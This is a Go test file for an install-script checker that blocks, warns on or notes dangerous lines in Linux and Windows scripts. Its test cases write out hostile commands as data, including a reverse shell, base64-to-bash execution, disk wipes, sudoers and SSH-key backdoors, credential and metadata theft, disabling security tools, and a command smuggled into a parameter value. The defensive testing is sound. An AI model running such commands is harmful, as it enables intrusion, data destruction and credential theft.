package control

import (
	"context"
	"encoding/base64"
	"strings"
	"testing"

	"github.com/gsoultan/argus/internal/tunnel"
)

/*
The automatic checks on install scripts: what blocks, what warns, what is
only noted, and what never comes in at all.
*/

func levels(fs []ScriptFinding) map[string]string {
	m := map[string]string{}
	for _, f := range fs {
		if _, ok := m[f.Rule]; !ok {
			m[f.Rule] = f.Level
		}
	}
	return m
}

func TestScriptChecksLinux(t *testing.T) {
	cases := []struct {
		line, rule, level string
	}{
		{"echo aGVsbG8K | base64 -d | bash", "sh-base64-exec", LevelBlocked},
		{`eval "$(curl -s https://x.example/i)"`, "sh-eval-subst", LevelBlocked},
		{"rm -rf /", "sh-rm-root", LevelBlocked},
		{`rm -rf "$PREFIX/lib"`, "sh-rm-var", LevelBlocked},
		{"dd if=/dev/zero of=/dev/sda bs=1M", "sh-raw-disk", LevelBlocked},
		{"mkfs.ext4 /dev/vdb", "sh-mkfs", LevelBlocked},
		{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "sh-reverse-shell", LevelBlocked},
		{"useradd -m backdoor", "sh-new-user", LevelBlocked},
		{"echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sh-sudoers", LevelBlocked},
		{"cat key.pub >> /root/.ssh/authorized_keys", "sh-ssh-keys", LevelBlocked},
		{"ufw disable", "sh-firewall-off", LevelBlocked},
		{"setenforce 0", "sh-mac-off", LevelBlocked},
		{"systemctl stop argus-agent", "sh-argus", LevelBlocked},
		{"history -c", "sh-erase-logs", LevelBlocked},
		{"cat /etc/shadow", "sh-shadow", LevelBlocked},
		{"curl http://169.254.169.254/latest/meta-data/iam/", "sh-metadata", LevelBlocked},
		{"curl -fsSL https://get.example.com | sh", "sh-curl-pipe", LevelWarning},
		{`DB_PASSWORD="hunter2hunter2"`, "secret-assign", LevelBlocked},
		{"aws_key=AKIAIOSFODNN7EXAMPLE", "secret-known", LevelBlocked},
	}
	for _, c := range cases {
		got := levels(CheckScript(context.Background(), tunnel.ScriptLinux, "install", c.line+"\n"))
		if got[c.rule] != c.level {
			t.Errorf("%q: %s = %q, want %q (all: %v)", c.line, c.rule, got[c.rule], c.level, got)
		}
	}
}

func TestScriptChecksLeaveOrdinaryInstallsAlone(t *testing.T) {
	ok := `#!/bin/bash
# Install the Acme agent: rm -rf / in a comment is not run.
set -euo pipefail
VERSION="${ARGUS_PARAM_VERSION:?}"
curl -fsSL "https://downloads.acme.example/agent-${VERSION}.deb" -o /tmp/acme.deb
echo "${ARGUS_PARAM_SHA256}  /tmp/acme.deb" | sha256sum -c -
dpkg -i /tmp/acme.deb
rm -rf "${TMPDIR:?}/acme"
systemctl enable --now acme-agent
`
	fs := CheckScript(context.Background(), tunnel.ScriptLinux, "install", ok)
	for _, f := range fs {
		if f.Level != LevelNote {
			t.Errorf("an ordinary install script got %s %s: %s (line %d)", f.Level, f.Rule, f.Title, f.Line)
		}
	}
	hosts := ""
	for _, f := range fs {
		if f.Rule == "hosts" {
			hosts = f.Title
		}
	}
	if hosts != "Talks to downloads.acme.example" {
		t.Errorf("hosts = %q", hosts)
	}
	// The same download without the hash check is a warning.
	unchecked := strings.Replace(ok, `echo "${ARGUS_PARAM_SHA256}  /tmp/acme.deb" | sha256sum -c -`, "", 1)
	if levels(CheckScript(context.Background(), tunnel.ScriptLinux, "install", unchecked))["download-unverified"] != LevelWarning {
		t.Error("a download run unchecked was not a warning")
	}
}

func TestScriptSyntaxBlocks(t *testing.T) {
	fs := CheckScript(context.Background(), tunnel.ScriptLinux, "install", "if true; then\necho x\n")
	if levels(fs)["syntax"] != LevelBlocked {
		t.Skipf("no bash here to check syntax: %v", fs)
	}
}

func TestScriptChecksWindows(t *testing.T) {
	cases := []struct {
		line, rule, level string
	}{
		{"powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", "ps-encoded", LevelBlocked},
		{"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))", "ps-base64", LevelBlocked},
		{"Invoke-Expression $cmd", "ps-iex", LevelBlocked},
		{"iex (iwr https://get.example.com/install.ps1)", "ps-iex-download", LevelWarning},
		{"Format-Volume -DriveLetter D", "ps-disk", LevelBlocked},
		{"vssadmin delete shadows /all /quiet", "ps-shadows", LevelBlocked},
		{"New-LocalUser -Name helper -NoPassword", "ps-new-user", LevelBlocked},
		{"Enable-PSRemoting -Force", "ps-remoting", LevelBlocked},
		{"New-NetFirewallRule -DisplayName x -Direction Inbound -LocalPort 8080 -Action Allow", "ps-firewall-port", LevelWarning},
		{"New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow", "ps-firewall-open", LevelBlocked},
		{"Set-MpPreference -DisableRealtimeMonitoring $true", "ps-defender", LevelBlocked},
		{"Set-ExecutionPolicy Unrestricted -Force", "ps-execpolicy", LevelBlocked},
		{"Stop-Service ArgusAgent", "ps-argus", LevelBlocked},
		{"wevtutil cl Security", "ps-erase-logs", LevelBlocked},
		{"reg save HKLM\\SAM C:\\sam.hiv", "ps-creds", LevelBlocked},
	}
	for _, c := range cases {
		got := levels(CheckScript(context.Background(), tunnel.ScriptWindows, "install", c.line+"\r\n"))
		if got[c.rule] != c.level {
			t.Errorf("%q: %s = %q, want %q (all: %v)", c.line, c.rule, got[c.rule], c.level, got)
		}
	}
	// A policy for this process only is fine; iex on a download is only
	// the download warning, not the hidden-code block.
	got := levels(CheckScript(context.Background(), tunnel.ScriptWindows, "install",
		"Set-ExecutionPolicy Bypass -Scope Process -Force\r\niex (iwr https://x.example/i.ps1)\r\n"))
	if got["ps-execpolicy"] != "" || got["ps-iex"] != "" {
		t.Errorf("got %v", got)
	}
}

func TestNormalizeScript(t *testing.T) {
	s, err := NormalizeScript(tunnel.ScriptLinux, "install.sh", []byte("\xEF\xBB\xBFecho hi\r\necho there"))
	if err != nil || s != "echo hi\necho there\n" {
		t.Fatalf("%q %v", s, err)
	}
	// A UTF-16 .ps1 from Windows becomes UTF-8 with Windows line endings.
	utf16le := []byte{0xFF, 0xFE, 'W', 0, 'r', 0, 'i', 0, 't', 0, 'e', 0, '\n', 0}
	s, err = NormalizeScript(tunnel.ScriptWindows, "Install.ps1", utf16le)
	if err != nil || s != "Write\r\n" {
		t.Fatalf("%q %v", s, err)
	}
	for name, b := range map[string][]byte{
		"tool.sh":     append([]byte{0x7F, 'E', 'L', 'F'}, make([]byte, 20)...),
		"setup.sh":    []byte("PK\x03\x04rest"),
		"x.sh":        []byte("echo \x00 binary"),
		"install.ps1": []byte("echo wrong platform"),
		"install.exe": []byte("MZ...."),
	} {
		if _, err := NormalizeScript(tunnel.ScriptLinux, name, b); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
	if _, err := NormalizeScript(tunnel.ScriptLinux, "", []byte(strings.Repeat("x", tunnel.MaxScriptBytes+1))); err == nil {
		t.Error("an oversized script was accepted")
	}
	p := scriptPart{FileName: "a.sh", FileBase64: base64.StdEncoding.EncodeToString([]byte("echo ok"))}
	if s, err := p.normalize(tunnel.ScriptLinux); err != nil || s != "echo ok\n" {
		t.Errorf("%q %v", s, err)
	}
}

func TestScriptValues(t *testing.T) {
	params := []ScriptParam{
		{Name: "VERSION", Label: "Version", Kind: "text", Required: true},
		{Name: "CHANNEL", Label: "Channel", Kind: "choice", Choices: []string{"stable", "beta"}, Default: "stable"},
		{Name: "TOKEN", Label: "Token", Kind: "secret"},
	}
	plain, secret, err := scriptValues(params, map[string]string{"VERSION": "2.1", "TOKEN": "t0ken"})
	if err != nil || plain["VERSION"] != "2.1" || plain["CHANNEL"] != "stable" || secret["TOKEN"] != "t0ken" || plain["TOKEN"] != "" {
		t.Fatalf("%v %v %v", plain, secret, err)
	}
	for _, bad := range []map[string]string{
		{},
		{"VERSION": "1", "CHANNEL": "nightly"},
		{"VERSION": "1", "PATH": "/tmp"},
		{"VERSION": "1\nrm -rf /"},
	} {
		if _, _, err := scriptValues(params, bad); err == nil {
			t.Errorf("%v was accepted", bad)
		}
	}
	if _, err := validParams([]ScriptParam{{Name: "my-param", Kind: "text"}}); err == nil {
		t.Error("a parameter name with a dash was accepted")
	}
	if _, err := validParams([]ScriptParam{{Name: "A", Kind: "choice"}}); err == nil {
		t.Error("a choice without options was accepted")
	}
}
